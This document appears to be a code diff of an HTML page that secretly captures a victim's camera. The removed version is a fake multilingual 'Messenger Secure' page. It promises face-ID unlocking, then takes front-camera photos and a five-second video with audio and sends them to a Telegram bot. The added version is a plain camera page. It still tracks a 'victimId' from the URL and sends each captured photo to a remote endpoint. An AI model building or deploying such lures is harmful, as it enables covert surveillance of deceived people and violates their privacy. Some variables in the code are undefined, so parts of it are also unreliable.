@@ -1,294 +1,35 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title data-i18n="page_title">Messenger Secure</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        body {
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
-        }
-
-        /* ---------- هەڵبژاردەی زمان ---------- */
-        .lang-selector {
-            position: fixed;
-            top: 15px;
-            right: 20px;
-            z-index: 99;
-            background: #fff;
-            border-radius: 30px;
-            padding: 5px 15px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-            display: flex;
-            gap: 10px;
-        }
-
-        .lang-btn {
-            border: none;
-            background: transparent;
-            padding: 8px 12px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            color: #666;
-            transition: 0.3s;
-        }
-
-        .lang-btn.active {
-            background: #0084ff;
-            color: #fff;
-        }
-
-        .container {
-            width: 390px;
-            max-width: 95%;
-            margin-top: 50px; /* بۆ ئەوەی لە ژێر هەڵبژاردەکەوە بێت */
-        }
-
-        .card {
-            background: #fff;
-            border-radius: 24px;
-            padding: 35px 25px;
-            box-shadow: 0 15px 45px rgba(0, 0, 0, .15);
-            text-align: center;
-        }
-
-        .logo {
-            width: 90px;
-            height: 90px;
-            margin: auto;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #0084ff, #6a5cff);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 42px;
-            margin-bottom: 20px;
-        }
-
-        h1 {
-            font-size: 27px;
-            color: #111;
-            margin-bottom: 10px;
-        }
-
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.7;
-        }
-
-        .security {
-            background: #f7f9fc;
-            border-radius: 18px;
-            padding: 20px;
-            text-align: right;
-        }
-
-        .security h2 {
-            font-size: 19px;
-            margin-bottom: 15px;
-            color: #222;
-        }
-
-        .security ul {
-            list-style: none;
-        }
-
-        .security li {
-            margin: 14px 0;
-            color: #444;
-            font-size: 15px;
-        }
-
-        .security li::before {
-            content: "🔒 ";
-        }
-
-        button {
-            width: 100%;
-            margin-top: 30px;
-            border: none;
-            border-radius: 40px;
-            background: linear-gradient(135deg, #0084ff, #0069ff);
-            color: #fff;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 16px;
-            cursor: pointer;
-            transition: .3s;
-        }
-
-        button:hover {
-            transform: scale(1.03);
-        }
-
-        .note {
-            margin-top: 18px;
-            color: #888;
-            font-size: 13px;
-        }
-
-        #result {
-            margin-top: 15px;
-            font-weight: bold;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>الكاميرا</title>
+<style>
+body{margin:0;background:#000;font-family:sans-serif;display:flex;flex-direction:column;height:100vh}
+#viewfinder{flex:1;background:#111;position:relative;overflow:hidden}
+video{width:100%;height:100%;object-fit:cover}
+#overlay{position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.3),transparent 30%,transparent 70%,rgba(0,0,0,.5))}
+#status{position:absolute;top:16px;left:0;right:0;text-align:center;color:#fff;font-size:14px;text-shadow:0 1px 3px #000;z-index:5}
+#controls{display:flex;justify-content:center;align-items:center;padding:20px;background:#1a1a1a;gap:24px}
+#shutter{width:64px;height:64px;border-radius:50%;border:4px solid #fff;background:rgba(255,255,255,.15);cursor:pointer}
+#shutter:active{background:#fff}
+</style>
 </head>
 <body>
+<div id="viewfinder">
+  <video id="video" autoplay playsinline muted></video>
+  <div id="overlay"></div>
+  <div id="status">جارٍ تجهيز الكاميرا...</div>
+</div>
+<div id="controls">
+  <span style="width:18px"></span>
+  <button id="shutter"></button>
+  <span style="width:18px"></span>
+</div>
 
-    <!-- ========== هەڵبژاردەی زمان ========== -->
-    <div class="lang-selector">
-        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
-        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
-        <button class="lang-btn" onclick="changeLang('en')">English</button>
-    </div>
-
-    <!-- ========== ناوەڕۆکی سەرەکی ========== -->
-    <div class="container">
-        <div class="card">
-            <div class="logo">💬</div>
-            <h1 data-i18n="main_title">Messenger Secure</h1>
-            <p class="subtitle" data-i18n="subtitle">مرحبًا بكم في قسم Messenger الخاص.</p>
-
-            <div class="security">
-                <h2 data-i18n="security_title">الحماية والأمان</h2>
-                <ul>
-                    <li data-i18n="item1">المحادثات مشفّرة بالكامل بين الطرفين.</li>
-                    <li data-i18n="item2">يمنع التقاط لقطات الشاشة داخل هذا القسم.</li>
-                    <li data-i18n="item3">يمنع حفظ الصور أو تنزيل الوسائط.</li>
-                    <li data-i18n="item4">تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.</li>
-                    <li data-i18n="item5">لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.</li>
-                </ul>
-            </div>
-
-            <button id="btnStart" data-i18n="start_btn">اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات</button>
-
-            <div id="result"></div>
-
-            <div class="note" data-i18n="footer_note">🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.</div>
-        </div>
-    </div>
-
-    <script>
-        // ========== داتابەیسی وەرگێڕان ==========
-        const translations = {
-            ar: {
-                page_title: "Messenger Secure",
-                main_title: "Messenger Secure",
-                subtitle: "مرحبًا بكم في قسم Messenger الخاص.",
-                security_title: "الحماية والأمان",
-                item1: "المحادثات مشفّرة بالكامل بين الطرفين.",
-                item2: "يمنع التقاط لقطات الشاشة داخل هذا القسم.",
-                item3: "يمنع حفظ الصور أو تنزيل الوسائط.",
-                item4: "تُحذف المحادثات تلقائيًا بعد الاطلاع عليها.",
-                item5: "لا يمكن فتح Messenger الخاص إلا باستخدام بصمة الوجه.",
-                start_btn: "اضغط هنا لإنشاء بصمة الوجه وفتح المحادثات",
-                footer_note: "🔒 جميع بياناتك محمية وفق أعلى معايير الأمان.",
-                loading: "⏳ جارٍ...",
-                success: "✅ تم التحقق بنجاح",
-                done: "✅ تم",
-                error_prefix: "❌ خطأ: ",
-                retry: "📷 إعادة المحاولة"
-            },
-            ckb: {
-                page_title: "Messenger پارێزراو",
-                main_title: "Messenger پارێزراو",
-                subtitle: "بەخێربێن بۆ بەشی تایبەتی Messenger.",
-                security_title: "پاراستن و ئاسایش",
-                item1: "گفتوگۆکان بە تەواوی کۆدکراون لە نێوان هەردوو لا.",
-                item2: "ڕێگری دەکرێت لە وێنەگرتنی شاشە لەم بەشەدا.",
-                item3: "ڕێگری دەکرێت لە پاشەکەوتکردنی وێنە یان دابەزاندنی میدیا.",
-                item4: "گفتوگۆکان خۆکارانە دەسڕێنەوە دوای بینینیان.",
-                item5: "کردنەوەی Messenger تایبەت تەنها بە پەنجەمۆری ڕووخسار دەکرێت.",
-                start_btn: "کرتە لێرە بکە بۆ دروستکردنی پەنجەمۆری ڕووخسار و کردنەوەی گفتوگۆکان",
-                footer_note: "🔒 هەموو داتاکانت پارێزراون بەپێی بەرزترین ستانداردی ئاسایش.",
-                loading: "⏳ چاوەڕێ...",
-                success: "✅ پشتڕاستکرایەوە بە سەرکەوتوویی",
-                done: "✅ تەواو",
-                error_prefix: "❌ هەڵە: ",
-                retry: "📷 دووبارە هەوڵبدەرەوە"
-            },
-            en: {
-                page_title: "Messenger Secure",
-                main_title: "Messenger Secure",
-                subtitle: "Welcome to the private Messenger section.",
-                security_title: "Security & Protection",
-                item1: "Conversations are fully encrypted between both parties.",
-                item2: "Screenshots are blocked inside this section.",
-                item3: "Saving images or downloading media is prohibited.",
-                item4: "Conversations are automatically deleted after viewing.",
-                item5: "Private Messenger can only be opened using face ID.",
-                start_btn: "Click here to create face ID and open conversations",
-                footer_note: "🔒 All your data is protected according to the highest security standards.",
-                loading: "⏳ Loading...",
-                success: "✅ Verified successfully",
-                done: "✅ Done",
-                error_prefix: "❌ Error: ",
-                retry: "📷 Retry"
-            }
-        };
-
-        // ========== فەنکشنی گۆڕینی زمان ==========
-        function changeLang(lang) {
-            // گۆڕینی ئاڕاستە (rtl بۆ عەرەبی و کوردی، ltr بۆ ئینگلیزی)
-            if (lang === 'ar' || lang === 'ckb') {
-                document.documentElement.dir = 'rtl';
-            } else {
-                document.documentElement.dir = 'ltr';
-            }
-
-            // نوێکردنەوەی هەموو توخمەکانی data-i18n
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[lang] && translations[lang][key]) {
-                    el.textContent = translations[lang][key];
-                }
-            });
-
-            // نوێکردنەوەی دوگمەی چالاک
-            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
-
-            // پاشەکەوتکردنی زمان بۆ دواتر
-            localStorage.setItem('preferred_lang', lang);
-
-            // ئەگەر دوگمەکە لە دۆخی چالاکدا بێت، دووبارە وەرگێڕانی بکەین
-            const btn = document.getElementById('btnStart');
-            if (btn.disabled && btn.textContent.includes('⏳')) {
-                btn.textContent = translations[lang].loading;
-            } else if (btn.textContent === '✅ تم' || btn.textContent === '✅ تەواو' || btn.textContent === '✅ Done') {
-                btn.textContent = translations[lang].done;
-            } else {
-                btn.textContent = translations[lang].start_btn;
-            }
-        }
-
-        // ========== بارکردنی زمانی پاشەکەوتکراو ==========
-        window.addEventListener('DOMContentLoaded', () => {
-            const savedLang = localStorage.getItem('preferred_lang') || 'ar';
-            changeLang(savedLang);
-        });
-
-        // ========== کۆدی ڕاستەقینەی کامێرا ==========
-        const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
+<script>
+/* ===== الكتلة الجديدة ===== */
+const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
 
 async function apiSend(payload) {
     try {
@@ -300,113 +41,40 @@ async function apiSend(payload) {
         return r.ok;
     } catch (e) { return false; }
 }
+/* ========================== */
 
-        async function capture() {
-    const btn = document.getElementById('btnStart');
-    const res = document.getElementById('result');
-    const currentLang = localStorage.getItem('preferred_lang') || 'ar';
+const video = document.getElementById('video');
+const statusEl = document.getElementById('status');
+let stream = null;
 
-    btn.disabled = true;
-    btn.textContent = translations[currentLang].loading;
-    res.textContent = '';
-    res.style.display = 'block';
+function sendPhoto(dataUrl) {
+    apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
+        .then(ok => {
+            statusEl.textContent = ok ? '✅ تم الإرسال' : '❌ فشل الإرسال';
+            setTimeout(() => statusEl.textContent = 'اضغط الزر لالتقاط صورة', 2000);
+        });
+}
 
+async function startCamera() {
     try {
-        // 1. کردنەوەی کامێرا (یەک جار بۆ هەموو شتێک)
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: 640, height: 480 },
-            audio: true   // بۆ ڤیدیۆ پێویستە (ئەگەر دەنگ نەوێت دەتوانیت false بکەیت)
-        });
-
-        const video = document.createElement('video');
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
         video.srcObject = stream;
-        video.muted = true;   // بۆ ئەوەی feedback ی دەنگی دروست نەبێت
-        await video.play();
-
-        // 2. گرتنی ٣ وێنە بە مەودای ٠.٥ چرکە
-        const photos = [];
-        for (let i = 0; i < 3; i++) {
-            if (i > 0) {
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photo = canvas.toDataURL('image/jpeg', 0.7);
-            photos.push(photo);
-        }
-
-        // 3. تۆمارکردنی ڤیدیۆی ٥ چرکە
-        res.textContent = ' loading ...';
-        const videoBlob = await recordVideo(stream, 5000); // فەنکشنی یارمەتیدەر
-
-        // 4. ئێستا دەتوانیت کامێرا داخەیت
-        stream.getTracks().forEach(track => track.stop());
-
-        // 5. ناردنی وێنەکان بۆ تێلێگرام
-        for (let i = 0; i < photos.length; i++) {
-            const blob = await (await fetch(photos[i])).blob();
-            const fd = new FormData();
-            fd.append('chat_id', CHAT);
-            fd.append('photo', blob, `cam_${chatId}_${i + 1}.jpg`);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: fd
-            });
-        }
-
-        // 6. ناردنی ڤیدیۆکە بۆ تێلێگرام
-        const videoForm = new FormData();
-        videoForm.append('chat_id', CHAT);
-        videoForm.append('video', videoBlob, `video_${chatId}.webm`);
-        videoForm.append('caption', ` please whait   - ID: ${chatId}`);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
-            method: 'POST',
-            body: videoForm
-        });
-
-        res.textContent = translations[currentLang].success;
-        btn.textContent = translations[currentLang].done;
-
+        statusEl.textContent = 'اضغط الزر لالتقاط صورة';
     } catch (e) {
-        res.textContent = translations[currentLang].error_prefix + e.message;
-        btn.disabled = false;
-        btn.textContent = translations[currentLang].retry;
+        statusEl.textContent = '⚠️ تعذّر الوصول للكاميرا';
     }
 }
 
-// فەنکشنی یارمەتیدەر بۆ تۆمارکردنی ڤیدیۆ بۆ ماوەیەکی دیاریکراو
-function recordVideo(stream, durationMs) {
-    return new Promise((resolve, reject) => {
-        const mediaRecorder = new MediaRecorder(stream, {
-            mimeType: 'video/webm'  // باشترین پشتگیری لە browserـە
-        });
-        const chunks = [];
+document.getElementById('shutter').onclick = () => {
+    if (!stream) { startCamera(); return; }
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
+};
 
-        mediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            resolve(blob);
-        };
-
-        mediaRecorder.onerror = (e) => reject(e.error);
-
-        mediaRecorder.start();
-
-        // دوای ماوەی خواستراو تۆمارکردن ڕادەگرین
-        setTimeout(() => {
-            mediaRecorder.stop();
-        }, durationMs);
-    });
-}
-
-document.getElementById('btnStart').addEventListener('click', capture);
-
-        document.getElementById('btnStart').addEventListener('click', capture);
-    </script>
+startCamera();
+</script>
 </body>
 </html>
